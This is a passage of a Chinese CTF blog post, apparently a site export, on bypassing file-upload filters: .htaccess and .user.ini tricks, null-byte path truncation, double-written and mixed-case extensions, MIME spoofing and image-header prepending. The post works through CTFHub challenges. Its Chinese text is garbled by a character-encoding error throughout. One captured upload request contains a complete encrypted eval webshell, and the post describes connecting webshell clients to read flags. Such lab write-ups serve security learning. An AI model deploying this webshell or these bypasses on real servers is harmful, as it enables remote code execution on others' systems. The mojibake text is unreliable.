.htaccessç»•è¿‡.htaccessç®€ä»‹.htaccessæ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒé‡Œé¢å­˜æ”¾ç€ApacheæœåŠ¡å™¨é…ç½®ç›¸å…³çš„æŒ‡ä»¤ã€‚é€šè¿‡.htaccesså¯ä»¥åšåˆ°ï¼šé‡å†™è§£æè§„åˆ™(å¦‚ï¼šå°†pngæ–‡ä»¶ä½œä¸ºphpæ¥è¿›è¡Œè§£æç­‰)ã€URLé‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€MIMEç±»å‹é…ç½®ä»¥åŠè®¿é—®æƒé™æ§åˆ¶ç­‰ã€‚ .htaccessçš„ä½œç”¨èŒƒå›´.htaccessçš„ç”Ÿæ•ˆèŒƒå›´ä¸º.htaccessæ–‡ä»¶æ‰€åœ¨çš„å½“å‰ç›®å½•ã€‚ .htaccessåˆ©ç”¨å‰æ ä½¿ç”¨Apache æœåŠ¡å™¨ï¼ˆ ä¸é€‚ç”¨äºNginx æœåŠ¡å™¨ï¼‰ èƒ½æˆåŠŸä¸Šä¼ .htaccessæ–‡ä»¶çš„ä¸Šä¼ ï¼Œä¸”æ²¡æœ‰è¢«é‡å‘½å .htaccessä½¿ç”¨æ¨¡æ¿#å¯¹äºphpAddHandler application/x-httpd-php .html #å°†htmlæ–‡ä»¶ä½œä¸ºphpæ–‡ä»¶è¿›è¡Œè§£æ ä¾‹é¢˜ï¼šCTFHUB-æŠ€èƒ½æ ‘-WEB-æ–‡ä»¶ä¸Šä¼ -.htaccess æŸ¥çœ‹é¡µé¢æºç å¯ä»¥å‘ç°é¡µé¢åç«¯æºç  !DOCTYPE htmlhtmlhead meta charset=UTF-8 titleCTFHub æ–‡ä»¶ä¸Šä¼  - htaccess/title/headbody h1CTFHub æ–‡ä»¶ä¸Šä¼  - htaccess/h1 form action= method=post enctype=multipart/form-data label for=fileFilename:/label input type=file name=file id=file / br / input type=submit name=submit value=Submit / /form/body/html!--if (!empty($_POST[submit])) $name = basename($_FILES[file][name]); $ext = pathinfo($name)[extension]; $blacklist = array(php, php7, php5, php4, php3, phtml, pht, jsp, jspa, jspx, jsw, jsv, jspf, jtml, asp, aspx, asa, asax, ascx, ashx, asmx, cer, swf); if (!in_array($ext, $blacklist)) if (move_uploaded_file($_FILES[file][tmp_name], UPLOAD_PATH . $name)) echo scriptalert(ä¸Šä¼ æˆåŠŸ)/script; echo ä¸Šä¼ æ–‡ä»¶ç›¸å¯¹è·¯å¾„br . UPLOAD_URL_PATH . $name; else echo scriptalert(ä¸Šä¼ å¤±è´¥)/script; else echo scriptalert(æ–‡ä»¶ç±»å‹ä¸åŒ¹é…)/script; -- åœ¨ $blacklist = array(php, php7, php5, php4, php3, phtml, pht, jsp, jspa, jspx, jsw, jsv, jspf, jtml, asp, aspx, asa, asax, ascx, ashx, asmx, cer, swf);å‘ç°å¤§å¤šæ•°çš„åŠ¨æ€æ‰§è¡Œè„šæœ¬æ–‡ä»¶åç¼€è¢«ç¦æ­¢ï¼Œä½†å‘ç°.htaccesså¹¶æ²¡æœ‰è¢«ç¦æ­¢ï¼Œæ­¤æ—¶å¯ä»¥ä¸Šä¼ æ–‡ä»¶.htaccess AddType application/x-httpd-php .txt å†ä¸Šä¼ å«æœ‰shellçš„phpä»£ç çš„txtæ–‡ä»¶ï¼Œä¸Šä¼ æˆåŠŸåï¼Œè®¿é—®upload/shell.php.txtï¼Œæ— å†…å®¹æ˜¾ç¤ºï¼Œè¯´æ˜.txtæ–‡ä»¶è¢«ä½œä¸ºphpè„šæœ¬æ‰§è¡ŒæˆåŠŸï¼Œä½¿ç”¨å†°èè¿æ¥ æˆåŠŸè·å–phpinfoé¡µé¢ï¼Œè¿æ¥æˆåŠŸï¼Œè¯»å–flag .user.iniç»•è¿‡.user.iniä»‹ç»php.iniæ˜¯phpçš„ä¸€ä¸ªå…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¯¹æ•´ä¸ªwebæœåŠ¡èµ·ä½œç”¨ï¼›è€Œ.user.iniä¸.htaccessç±»ä¼¼ï¼Œè®¾ç½®å½“å‰ç›®å½•çš„é…ç½®ä¿¡æ¯ã€‚ è¯¦ç»†å‚è€ƒä¿¡æ¯ï¼š PHP: .user.ini æ–‡ä»¶ - Manualã€php - ç¥ç§˜çš„.user.iniæ–‡ä»¶ å…¶ä¸­php é…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªé…ç½®å¯ä»¥èµ·åˆ°æ–‡ä»¶åŒ…å«çš„ä½œç”¨ auto_prepend_file = filename //å°†æŒ‡å®šæ–‡ä»¶åŒ…å«åœ¨è¯¥ç›®å½•ä¸­æ‰€æœ‰phpè„šæœ¬çš„æ–‡ä»¶å¤´éƒ¨auto_append_file = filename //å°†æŒ‡å®šæ–‡ä»¶åŒ…å«åœ¨è¯¥ç›®å½•ä¸­æ‰€æœ‰phpè„šæœ¬çš„æ–‡ä»¶å°¾éƒ¨ .user.iniä½¿ç”¨å‰æ èƒ½æˆåŠŸä¸Šä¼ .user.iniæ–‡ä»¶çš„ä¸Šä¼ ï¼Œä¸”æ²¡æœ‰è¢«é‡å‘½å æ­¤ç›®å½•ä¸‹å·²æœ‰ä¸€ä¸ªä»»æ„çš„.phpæ–‡ä»¶ .user.iniä½œç”¨èŒƒå›´ä¸.htaccessæ–‡ä»¶ç›¸åŒï¼Œ.user.iniçš„ç”Ÿæ•ˆèŒƒå›´ä¸º.user.iniæ–‡ä»¶æ‰€åœ¨çš„å½“å‰ç›®å½•ã€‚ .user.iniä½¿ç”¨æ–¹æ³•1.é¦–å…ˆä¸Šä¼ ä¸€ä¸ªå«æœ‰phpä»£ç çš„ä»»æ„ç¬¦åˆåç«¯æ£€æµ‹çš„æ–‡ä»¶ï¼Œä»¥.jpgä¸ºä¾‹ï¼š æ–‡ä»¶åä¸ºinfo.jpg,å†…å®¹ä¸º ?php phpinfo();? 2.è½½ä¸Šä¼ å…¥.user.iniæ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š auto_prepend_file = info.jpg æ³¨ï¼šinfo.jpgéœ€è¦è‡ªå·±ä¸Šä¼ é—®æ–‡ä»¶åæ¥ç¡®å®š 3.è®¿é—®æ–‡ä»¶ä¸Šä¼ ç›®å½•ä¸‹çš„ä»»æ„.phpæ–‡ä»¶å³å¯ ä¾‹é¢˜ï¼šæ•°å­—åç¼€ç»•è¿‡æ•°å­—åç¼€ç®€ä»‹PHP æ–‡ä»¶çš„æ ‡å‡†åç¼€å§‹ç»ˆæ˜¯ .phpï¼Œé€‚ç”¨äºæ‰€æœ‰ç‰ˆæœ¬çš„ PHPã€‚ç„¶è€Œï¼Œåœ¨æŸäº›ç‰¹å®šåœºæ™¯æˆ–ç”±æŸäº›å¼€å‘è€…ç³»ç»Ÿä¸­ï¼Œä½¿ç”¨.php3 ã€.php5 ã€.php7 ç­‰ä¸æ˜¯ PHP è¯­è¨€çš„æ ‡å‡†æ–‡ä»¶åç¼€,ç”±äºä¸€äº›ç‰¹æ®Šçš„è®¾ç½®.php7 ç­‰åç¼€å¯è¢«PHPè§£é‡Šå™¨è§£æ ä½¿ç”¨æ¡ä»¶ï¼šApache çš„é…ç½®æ–‡ä»¶æˆ–ç›®å½•ä¸‹çš„.htaccess æ–‡ä»¶æœ‰æ·»åŠ è®¾ç½®ï¼Œå¦‚.php7å¯è¢«è§£æçš„é…ç½®ä¸ºï¼š AddHandler application/x-httpd-php .php7 åˆ©ç”¨ä¸­é—´ä»¶æ¼æ´ ä¸­é—´ä»¶æ¼æ´æ˜¯æŒ‡åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­ä½¿ç”¨çš„ä¸­é—´ä»¶è½¯ä»¶ä¸­å­˜åœ¨çš„å®‰å…¨æ¼æ´ã€‚ä¸­é—´ä»¶æ˜¯æŒ‡ä½äºæ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºä¹‹é—´çš„è½¯ä»¶ç»„ä»¶ï¼Œç”¨äºæä¾›ä¸åŒåº”ç”¨ç¨‹åºä¹‹é—´çš„é€šä¿¡å’Œäº¤äº’ã€‚å¸¸è§çš„ä¸­é—´ä»¶åŒ…æ‹¬æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€WebæœåŠ¡å™¨(å¦‚ï¼šApacheã€Nginx)ç­‰ã€‚ æŒ‡è·¯ğŸ‘‰ä¸­é—´ä»¶æ¼æ´ åç«¯ç»•è¿‡-è½¯ä»¶æ¼æ´ åˆ©ç”¨PHPæŸäº›ç‰ˆæœ¬çš„BUGå¯ä»¥åšåˆ°ä¸€äº›æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚ä¾‹å¦‚ï¼Œ00æˆªæ–­ PHP 00æˆªæ–­ç»•è¿‡æ„Ÿè°¢Diffanyå¸ˆå‚…æä¾›çš„æŒ‡å¯¼,https://gudiffany.github.io/https://wells.host/Diffany, 00æˆªæ–­åˆ©ç”¨æ¡ä»¶ phpç‰ˆæœ¬è¦å°äº5.3.4ï¼Œ5.3.4åŠä»¥ä¸Šå·²ç»ä¿®å¤è¯¥é—®é¢˜ PHPçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€ ç”¨æˆ·å¯æŒ‡å®šä¸Šä¼ è·¯å¾„ 00ç»•è¿‡ç®€ä»‹ASCIIä¸­0ä½œä¸ºç‰¹æ®Šå­—ç¬¦ä¿ç•™ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸã€‚ å½“ç”¨æˆ·ä¼ é€’æ–‡ä»¶ä¸Šä¼ è·¯å¾„åŒ…å«00ï¼Œæ— è®º00åå­˜åœ¨ä»»ä½•å†…å®¹æ–‡æœ¬(æˆ–åç«¯ç›´æ¥å¯¹00å­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥å…¶ä»–å­—ç¬¦ä¸²)ï¼Œ00åçš„å†…å®¹éƒ½ä¼šè¢«æˆªæ–­ï¼Œæœ€åå­—ç¬¦ä¸²ç•™ä¸‹00å‰çš„å†…å®¹ä¸”ä¸åŒ…æ‹¬00ã€‚ ä»¥GETæ–¹å¼ä¸¾ä¾‹ï¼š ASCIIä¸­çš„00ï¼Œæ— æ³•ç›´æ¥æ˜¾ç¤ºï¼Œæ‰€ä»¥ä½¿ç”¨URLç¼–ç ï¼ŒASCIIä¸­00ç»è¿‡urlç¼–ç åå˜ä¸º%00 é¡µé¢æºç ä¸ºï¼š ?php include $_GET[file];? test.txtçš„å†…å®¹ä¸º ?php echo SUCCESS;? test.txt%00.2.txtçš„å†…å®¹ä¸º ?php echo False;? å®éªŒ1 æ­¤æ—¶é€šè¿‡GETä¼ é€’å‚æ•°ï¼Œ?file=test.txt%00.2.txt é¡µé¢å‡ºç°SUCCESSï¼Œè¯´æ˜includeçš„æ–‡ä»¶æ˜¯test.txtï¼Œæ­¤æ—¶fileè¢«è§£æä¸ºtest.txt å®éªŒ2ï¼šæ”¹å˜é¡µé¢æºç  ?php\t$file = $_GET[file] . .2.txt; include $_GET[file];? æ­¤æ—¶é€šè¿‡GETä¼ é€’å‚æ•°ï¼Œ?file=test.txt%00 é¡µé¢è¿˜æ˜¯å‡ºç°SUCCESSï¼Œè¯´æ˜includeçš„æ–‡ä»¶æ˜¯test.txtï¼Œè€Œä¸æ˜¯test.txt.2.txtï¼Œæ­¤æ—¶å˜é‡fileå—$_GET[file]ä¸­çš„å½±å“ï¼Œä¸€åŒè¢«æˆªæ–­ 00ç»•è¿‡æ–¹æ³•GETä¼ å‚ä¿å­˜è·¯å¾„åç«¯å¯¹æ–‡ä»¶è·¯å¾„çš„å¤„ç†ç±»ä¼¼ä¸º $des = $_GET[road] . /å¯¹æ–‡ä»¶åçš„å¤„ç†æ“ä½œ...... . $ext; æ­¤æ—¶roadä¸ºæˆ‘ä»¬å¯æ§çš„å‚æ•°ï¼Œå¯ç›´æ¥è¿›è¡Œä½¿ç”¨%00æˆªæ–­ ç”±äºä½¿ç”¨00æˆªæ–­ï¼Œæ‰€ä»¥æœ€åæ–‡ä»¶ä¿å­˜åœ¨/var/www/html/upload,åä¸ºshell.php,æ ¹æ®ä½ç½®ï¼Œè®¿é—®/upload/shell.php,å³è¿›å…¥æˆ‘ä»¬æ‰€åœ¨çš„é¡µé¢ï¼Œä½¿ç”¨èšå‰‘è¿ä¸Šåï¼Œå¯ä»¥æ‰¾åˆ°æˆ‘ä»¬æˆåŠŸæˆªæ–­çš„shell.php POSTä¼ å‚ä¿å­˜è·¯å¾„ä¸GETä¼ å‚ç±»ä¼¼çš„çš„æ˜¯ï¼šåç«¯å¯¹æ–‡ä»¶è·¯å¾„çš„å¤„ç†ç±»ä¼¼ä¸º $des = $_POST[road] . /å¯¹æ–‡ä»¶åçš„å¤„ç†æ“ä½œ...... . $ext; æ­¤æ—¶roadä¸ºæˆ‘ä»¬å¯æ§çš„å‚æ•°ï¼Œä½†ä¸GETä¼ å‚ä¸åŒçš„æ˜¯ï¼Œhttpè¯·æ±‚å†…åŒ…å«æ–‡ä»¶æ—¶ï¼ŒPOSTå‚æ•°ä¸å†è¢«è‡ªåŠ¨è§£ç ï¼Œæ‰€ä»¥POSTä¼ å‚éœ€è¦ä½¿ç”¨BPä½¿ç”¨æŸ¥çœ‹16è¿›åˆ¶çš„è¯·æ±‚è¯¦æƒ…ï¼Œä¿®æ”¹ä¸€ä¸ªåå…­è¿›åˆ¶çš„ä¸º00 æ­¥éª¤ä¸€ï¼šä¿®æ”¹è·¯å¾„æ·»åŠ æ–‡ä»¶åï¼Œå†™å…¥éœ€è¦æ‰§è¡Œçš„ä»£ç è¯­å¥ æ­¥éª¤ä¸€ï¼šåˆ‡æ¢ä¸ºåå…­è¿›åˆ¶æ¨¡å¼ï¼Œä¿®æ”¹æ‰€éœ€è¦æ›¿æ¢ä¸º00çš„ä½ç½® ç”±äºä½¿ç”¨00æˆªæ–­ï¼Œæ‰€ä»¥æœ€åæ–‡ä»¶ä¿å­˜åœ¨/var/www/html/upload,åä¸ºtest.php,æ ¹æ®ä½ç½®ï¼Œè®¿é—®/upload/test.php,å³è¿›å…¥æˆ‘ä»¬æ‰€åœ¨çš„é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°PHPçš„é…ç½®ä¿¡æ¯ï¼Œ00æˆªæ–­æˆåŠŸ ä¾‹é¢˜ï¼šCTFHUB-æŠ€èƒ½æ ‘-WEB-æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­ æŸ¥çœ‹é¡µé¢æºä»£ç å‘ç°åç«¯çš„æºç  if (!empty($_POST[submit])) $name = basename($_FILES[file][name]); $info = pathinfo($name); $ext = $info[extension]; $whitelist = array(jpg, png, gif); if (in_array($ext, $whitelist)) $des = $_GET[road] . / . rand(10, 99) . date(YmdHis) . . . $ext; if (move_uploaded_file($_FILES[file][tmp_name], $des)) echo scriptalert(ä¸Šä¼ æˆåŠŸ)/script; else echo scriptalert(ä¸Šä¼ å¤±è´¥)/script; else echo æ–‡ä»¶ç±»å‹ä¸åŒ¹é…; æŠ“åŒ…ï¼Œä¿®æ”¹GETå‚æ•°ä¸º?road=/var/www/html/upload/shell.php%00ï¼Œä½¿ç”¨00æˆªæ–­ï¼Œåœ¨ä¼ å…¥æ–‡ä»¶çš„å†…å®¹æ›¿æ¢æˆéœ€è¦æ‰§è¡Œçš„ä»£ç ï¼Œå¦‚ä¸€å¥è¯ç­‰ ç„¶åä½¿ç”¨èšå‰‘è¿æ¥è¿›å…¥ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ˜¯æˆåŠŸä½¿ç”¨00æˆªæ–­å†™å…¥çš„shell.php åç«¯æ£€æµ‹-ä¿®æ”¹ç»•è¿‡ é€šè¿‡æŠ“åŒ…æˆ‘ä»¬å‘é€çš„è¯·æ±‚ï¼Œä¿®æ”¹è¯·æ±‚åŒ…ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œå¦‚ä¿®æ”¹æ–‡ä»¶å(é»‘åå•åŒå†™ï¼Œå¤§å°å†™æ›¿æ¢)ï¼ŒMIMEï¼Œæ·»åŠ æ–‡ä»¶å¤´ç­‰ç­‰æ“ä½œï¼Œä½¿ä¹‹ä¸Šä¼ çš„æœ¨é©¬ç¬¦åˆåç«¯çš„è¦æ±‚ï¼Œä½¿ä¹‹æˆåŠŸä¸Šä¼ ã€‚ åŒå†™ç»•è¿‡åŒå†™ç»•è¿‡åŸç†æœ‰æ—¶å€™åœ¨æ£€æµ‹æ—¶ï¼Œåå°ä¼šæŠŠæ•æ„Ÿå­—ç¬¦åˆ é™¤ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨åŒå†™è¿›è¡Œç»•è¿‡ã€‚æ¯”å¦‚ï¼šå°†.phpæ”¹å†™ä¸º.pphphp åç«¯çš„ä»£ç ç±»ä¼¼ä¸ºï¼š $name = basename($_FILES[file][name]);$blacklist = array(php, php5, php4, php3, phtml, pht, jsp, jspa, jspx, jsw, jsv, jspf, jtml, asp, aspx, asa, asax, ascx, ashx, asmx, cer, swf, htaccess, ini);$name = str_ireplace($blacklist, , $name); //str_ireplace() å‡½æ•°æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ ä¾‹é¢˜ï¼šCTFHUB-æŠ€èƒ½æ ‘-WEB-æ–‡ä»¶ä¸Šä¼ -åŒå†™åç¼€ æŸ¥çœ‹é¡µé¢æºç ï¼Œå‘ç°è¿™æ ·ä¸€æ®µå†…å®¹ !--$name = basename($_FILES[file][name]);$blacklist = array(php, php5, php4, php3, phtml, pht, jsp, jspa, jspx, jsw, jsv, jspf, jtml, asp, aspx, asa, asax, ascx, ashx, asmx, cer, swf, htaccess, ini);$name = str_ireplace($blacklist, , $name);-- è¿™æ—¶å€™ä¸Šä¼ shellæ–‡ä»¶ï¼Œå¹¶æŠ“åŒ…ï¼Œå°†åç¼€å.phpæ”¹å†™ä¸º.pphphpï¼Œå†å‘åŒ…æœ€åæˆåŠŸä¸Šä¼  å¤§å°å†™åç¼€ç»•è¿‡å¤§å°å†™åç¼€ç»•è¿‡åç«¯åœ¨æ£€æµ‹æ—¶ï¼Œåå°ä¼šæ£€æµ‹æ•æ„Ÿå­—ç¬¦ï¼Œå¦‚æœå¹¶æ²¡æœ‰ä¸åŒºåˆ†å¤§å°å†™æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¤§å°å†™è¿›è¡Œç»•è¿‡ã€‚æ¯”å¦‚ï¼šå°†.phpæ”¹å†™ä¸º.pHp åç«¯çš„ä»£ç ç±»ä¼¼ä¸ºï¼š $name = basename($_FILES[file][name]);$blacklist = array(php, php5, php4, php3, phtml, pht, jsp, jspa, jspx, jsw, jsv, jspf, jtml, asp, aspx, asa, asax, ascx, ashx, asmx, cer, swf, htaccess, ini);$pattern = /\\b( . implode(|, $blacklist) . )\\b/; //åŒºåˆ†å¤§å°å†™if (preg_match($pattern, $name)) echo hack; exit(); MIMEæ£€æµ‹ç»•è¿‡MIMEç®€ä»‹MIME (Multipurpose Internet Mail Extensions) æ˜¯æè¿°æ¶ˆæ¯å†…å®¹ç±»å‹çš„æ ‡å‡†ï¼Œç”¨æ¥è¡¨ç¤ºæ–‡æ¡£ã€æ–‡ä»¶æˆ–å­—èŠ‚æµçš„æ€§è´¨å’Œæ ¼å¼ã€‚æµè§ˆå™¨é€šå¸¸ä½¿ç”¨ MIME ç±»å‹ï¼ˆè€Œä¸æ˜¯æ–‡ä»¶æ‰©å±•åï¼‰æ¥ç¡®å®šå¦‚ä½•å¤„ç†URLã€‚éƒ¨åˆ†Webåº”ç”¨ç³»ç»Ÿåˆ¤å®šæ–‡ä»¶ç±»å‹æ˜¯é€šè¿‡content-typeå­—æ®µï¼Œæˆªå–ä¸€ä¸ªè¯·æ±‚ä¿¡æ¯ï¼š POST / HTTP/1.1Content-Length: 930Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydBnKdxUvNtC4xakzUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://challenge-bb136257750ed7ee.sandbox.ctfhub.com:10800/Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundarydBnKdxUvNtC4xakzContent-Disposition: form-data; name=file; filename=echo.phpContent-Type: application/octet-stream?phpecho wells;?------WebKitFormBoundarydBnKdxUvNtC4xakzContent-Disposition: form-data; name=submitSubmit------WebKitFormBoundarydBnKdxUvNtC4xakz-- å…¶ä¸­Content-Type: application/octet-streamå’Œå°±æ˜¯æè¿°äº†ä¸Šä¼ æ–‡ä»¶çš„MIME ç±»å‹ MIMEç»•è¿‡æ–¹æ³•éƒ¨åˆ†Webåº”ç”¨ç³»ç»Ÿåˆ¤å®šæ–‡ä»¶ç±»å‹æ˜¯é€šè¿‡content-typeå­—æ®µï¼Œå› æ­¤å¯ä»¥é€šè¿‡æŠ“åŒ…ï¼Œå°†content-typeå­—æ®µæ”¹ä¸ºå¸¸è§çš„å›¾ç‰‡ç±»å‹ï¼Œå¦‚image/gifï¼Œä»è€Œç»•è¿‡æ ¡éªŒã€‚ å¸¸è§çš„MIMEç±»å‹:text/plain ï¼ˆçº¯æ–‡æœ¬ï¼‰ text/html ï¼ˆHTMLæ–‡æ¡£ï¼‰ text/javascript ï¼ˆjsä»£ç ï¼‰ application/xhtml+xml ï¼ˆXHTMLæ–‡æ¡£ï¼‰ image/gif ï¼ˆGIFå›¾åƒï¼‰ image/jpeg ï¼ˆJPEGå›¾åƒï¼‰ image/png ï¼ˆPNGå›¾åƒï¼‰ video/mpeg ï¼ˆMPEGåŠ¨ç”»ï¼‰ application/octet-stream ï¼ˆäºŒè¿›åˆ¶æ•°æ®ï¼‰ application/pdf ï¼ˆPDFæ–‡æ¡£ï¼‰ ä¾‹é¢˜ï¼šCTFHUB-æŠ€èƒ½æ ‘-WEB-æ–‡ä»¶ä¸Šä¼ -MIMEç»•è¿‡ å°è¯•ç›´æ¥ä¸Šä¼ .htaccesså’Œphpshellæ–‡ä»¶æ—¶éƒ½ä¸Šä¼ å¤±è´¥ï¼Œå°è¯•ä¿®æ”¹MIMEç±»å‹ï¼ŒæŠ“åŒ…åŸå§‹è¯·æ±‚å¤´ POST / HTTP/1.1Content-Length: 930Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydBnKdxUvNtC4xakzUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://challenge-bb136257750ed7ee.sandbox.ctfhub.com:10800/Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundarydBnKdxUvNtC4xakzContent-Disposition: form-data; name=file; filename=shell.phpContent-Type: application/octet-stream?php@error_reporting(0);session_start(); $key=7dad18e6e49e447a;\t$_SESSION[k]=$key;\tsession_write_close();\t$post=file_get_contents(php://input);\tif(!extension_loaded(openssl)) $t=base64_.decode; $post=$t($post.); for($i=0;$istrlen($post);$i++) $post[$i] = $post[$i]^$key[$i+115]; else $post=openssl_decrypt($post, AES128, $key); $arr=explode(|,$post); $func=$arr[0]; $params=$arr[1];\tclass Cpublic function __invoke($p) eval($p.); @call_user_func(new C(),$params);?------WebKitFormBoundarydBnKdxUvNtC4xakzContent-Disposition: form-data; name=submitSubmit------WebKitFormBoundarydBnKdxUvNtC4xakz-- å°† ------WebKitFormBoundary4BffHh31AMlHQtBdContent-Disposition: form-data; name=file; filename=shell.phpContent-Type: application/octet-stream ä¿®æ”¹ä¸º ------WebKitFormBoundary4BffHh31AMlHQtBdContent-Disposition: form-data; name=file; filename=shell.phpContent-Type: image/gif å†æ”¾è¡Œï¼Œæœ€åå‘ç°shell.phpè¢«æˆåŠŸä¸Šä¼ ï¼Œè®¿é—®upload/shell.phpï¼Œæ— å†…å®¹æ˜¾ç¤ºï¼Œè¯´æ˜.txtæ–‡ä»¶è¢«ä½œä¸ºphpè„šæœ¬æ‰§è¡ŒæˆåŠŸï¼Œä½¿ç”¨å†°èè¿æ¥ æˆåŠŸè·å–phpinfoé¡µé¢ï¼Œè¿æ¥æˆåŠŸï¼Œè¯»å–flag æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ç®€ä»‹æ–‡ä»¶å¤´æ˜¯åœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ï¼ˆåŒ…æ‹¬å›¾ç‰‡ï¼Œè§†é¢‘æˆ–å…¶ä»–çš„éASCIIæ–‡ä»¶ï¼‰çš„å¼€å¤´ï¼ˆåå…­è¿›åˆ¶è¡¨ç¤ºï¼‰çš„ä¸€æ®µæ•°æ®ï¼Œç”¨äºæè¿°æ–‡ä»¶çš„å±æ€§å’Œæ ¼å¼ä¿¡æ¯ï¼Œ åœ¨è¿›è¡Œæ–‡ä»¶å¤´ç»•è¿‡æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå›¾ç‰‡çš„æ–‡ä»¶å¤´æ·»åŠ åˆ°æˆ‘ä»¬çš„æœ¨é©¬å†…å®¹æœ€å‰é¢ï¼Œè¾¾åˆ°ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹çš„ç›®çš„ã€‚ å¸¸è§çš„æ–‡ä»¶å¤´æ³¨æ„ï¼šæ–‡æœ¬å½¢å¼è¯·ç‚¹å‡»å¤åˆ¶ï¼Œä¸è¦åšä»»ä½•ä¿®æ”¹ GIFï¼š 16è¿›åˆ¶æ¨¡å¼ï¼š47 49 46 38 39 61 å¯¹åº”æ–‡æœ¬ï¼š GIF89a pngï¼š 16è¿›åˆ¶æ¨¡å¼ï¼š89 50 4E 47 0D 0A 1A 0A å¯¹åº”æ–‡æœ¬ï¼š â€°PNG JPGï¼š 16è¿›åˆ¶æ¨¡å¼ï¼šFF D8 FF E0 00 10 4A 46 49 46 å¯¹åº”æ–‡æœ¬ï¼š Ã¿Ã˜Ã¿Ã  æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡æ¡ä»¶ æŸäº›æƒ…å†µä¸‹ï¼Œåç«¯å¯èƒ½è¿˜ä¼šæ£€æµ‹æ–‡ä»¶æ‹“å±•åï¼Œæ­¤æ—¶éœ€è¦ç»“åˆè§£ææ¼æ´æˆ–è€…æ–‡ä»¶åŒ…å«æ‰èƒ½å®ç°æ‰§è¡Œæœ¨é©¬ ä¾‹é¢˜ï¼šCTFHUB-æŠ€èƒ½æ ‘-WEB-æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶å¤´æ£€æŸ¥ æ­¥éª¤ä¸€ï¼šç›´æ¥é€‰æ‹©æœ¨é©¬æ–‡ä»¶è¿›è¡Œä¸Šä¼ ï¼Œç„¶åè¿›è¡ŒæŠ“åŒ… ä»¥æ·»åŠ PNGè¯·æ±‚å¤´ä¸ºä¾‹ æ–¹æ³•ä¸€ï¼šåœ¨PHPä»£ç å‰æ·»åŠ å…¥ä»»æ„å…«ä¸ªå­—æ¯ï¼Œç”¨äºå®šä½ä»¥åŠæ›¿æ¢ä¸ºPNGçš„æ–‡ä»¶å¤´ï¼Œåè½¬HEXæ¨¡å¼æ›¿æ¢ä¸ºPNGçš„æ–‡ä»¶å¤´ æ–¹æ³•äºŒï¼šç›´æ¥åœ¨PHPä»£ç åæ’å…¥PNGæ–‡ä»¶å¤´å¯¹åº”çš„æ–‡æœ¬è¡¨ç¤ºç¬¦å·","tags":["CTF-Web","Web-FileUpload"],"categories":["web"]},{"title":"XSS","path":"/posts/fe1aa8c3/","content":"XSSç®€ä»‹åŠ¨æ€ç«™ç‚¹ä¼šå—åˆ°ä¸€ç§åä¸ºâ€œè·¨ç«™è„šæœ¬æ”»å‡»â€ï¼ˆCross Site Scriptingï¼Œç¼©å†™æˆXSSï¼‰çš„å¨èƒï¼Œæ¶æ„æ”»å‡»è€…ä¼šåœ¨ Webé¡µé¢é‡Œæ’å…¥æ¶æ„Scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚è·¨ç«™è„šæœ¬æ”»å‡»å…è®¸æ¶æ„ç”¨æˆ·å°†ä»£ç æ³¨å…¥ç½‘é¡µï¼Œå…¶ä»–ç”¨æˆ·åœ¨æµè§ˆç½‘é¡µæ—¶ä¼šå—åˆ°å½±å“ï¼Œæ¶æ„ç”¨æˆ·åˆ©ç”¨xss ä»£ç æ”»å‡»æˆåŠŸåï¼Œå¯èƒ½å¾—åˆ°å¾ˆé«˜çš„æƒé™ã€ç§å¯†ç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œcookieç­‰å„ç§å†…å®¹ XSSçš„åˆ†ç±»ï¼š1ã€åå°„å‹(éæŒä¹…åŒ–)â€‹\t(1)åŸç† 